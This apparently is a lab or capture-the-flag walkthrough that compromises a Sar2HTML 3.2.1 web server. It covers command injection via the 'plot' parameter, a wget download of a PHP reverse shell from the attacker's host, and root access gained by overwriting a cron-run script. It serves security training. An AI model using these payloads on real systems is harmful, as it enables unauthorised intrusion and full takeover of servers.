![image](https://user-images.githubusercontent.com/68326057/117229703-1f834e80-ae39-11eb-8277-970c6416ef8e.png)


# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHy/WJJHLFdbwbJpTyRYhEyj2jZV024UPWIdXfNHxq45uh08jkihv3znZ98caLP/pz352c0ZYD31We0bTSbHyjQce2bSAJHubDYp13hU/P4tbV5GIJ72W2rWkLTslH/SJoHUSqlManB7ZzgVyU2KQ4fnNx/V1XGJYsshquRqTrXKeeal+yQvTC4gnsr8ENIGMq0yJnYxMAasx6kmSc+S+065Mie65xkyisFXo2MQyxzsFdCu2w1bYmb3pegYDm6Y0c/EJP0sxDizXVwkUOS0XSVdGuk3RUYjt5GQ2fL24ZsML6CwN+HD2ZTnD0FK90PQTLuvlp6BoI/ZWvIenNvu63
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgxutbLnN4K2tj6ZHzrlzTKS+RRuly+RkA0J63JsQFiwyvz4PqA64w/h0Se3gymZV6zJ9XBpS41b6IoEymeiSA=
|   256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+5254x35Vwa2S7X73YLY87Q58qQOD9oQeSKMpmmT0o

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

--> /robots.txt

```bash
sar2HTML
```

![image](https://user-images.githubusercontent.com/68326057/117230020-bd771900-ae39-11eb-8333-6ff4dd44e874.png)

```bash
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Sar2HTML 3.2.1 - Remote Command Execution                                                            | php/webapps/47204.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
```

![image](https://user-images.githubusercontent.com/68326057/117230659-3034c400-ae3b-11eb-9cae-589f2be3d615.png)

# Test
http://192.168.181.35/sar2HTML/index.php?plot=;id

![image](https://user-images.githubusercontent.com/68326057/117230734-4f335600-ae3b-11eb-9c29-7a43916210e2.png)


# Test -2
```bash
;sleep 5
```
```bash
passed
```

# test3
```bash
;wget ip:8000/k.php  (here k.php is reverse shell)
```

![image](https://user-images.githubusercontent.com/68326057/117231624-3166f080-ae3d-11eb-9db0-6f63750d9b6a.png)


![image](https://user-images.githubusercontent.com/68326057/117231609-2c09a600-ae3d-11eb-81f9-0247f2617333.png)

# user -wwwdata

```bash
go on this site --> http://192.168.181.35/sar2HTML/k.php
```

![image](https://user-images.githubusercontent.com/68326057/117231651-42affd00-ae3d-11eb-9376-be529c41dd64.png)

![image](https://user-images.githubusercontent.com/68326057/117231770-8276e480-ae3d-11eb-846f-e8b81f689927.png)


![image](https://user-images.githubusercontent.com/68326057/117231783-8b67b600-ae3d-11eb-836c-e103d4f781c1.png)

```bash
cat /etc/crontab

```
![image](https://user-images.githubusercontent.com/68326057/117231810-99b5d200-ae3d-11eb-8177-ff7e2b167d67.png)

![image](https://user-images.githubusercontent.com/68326057/117231843-ad613880-ae3d-11eb-8353-2fb9ac6556ca.png)

We can not write but can read and execute.

![image](https://user-images.githubusercontent.com/68326057/117231879-c10c9f00-ae3d-11eb-8be7-a6b308af3e34.png)

![image](https://user-images.githubusercontent.com/68326057/117231901-cc5fca80-ae3d-11eb-810c-5c8215fc401d.png)

But we can read write and execute on write.sh

# root

```bash
in /var/www/html
chmod +x sar2HTML/k.php
echo '''
php sar2HTML/k.php
''' > write.sh
```

wait for few minute and :-

![image](https://user-images.githubusercontent.com/68326057/117232552-02517e80-ae3f-11eb-9505-cb3a339c1a94.png)

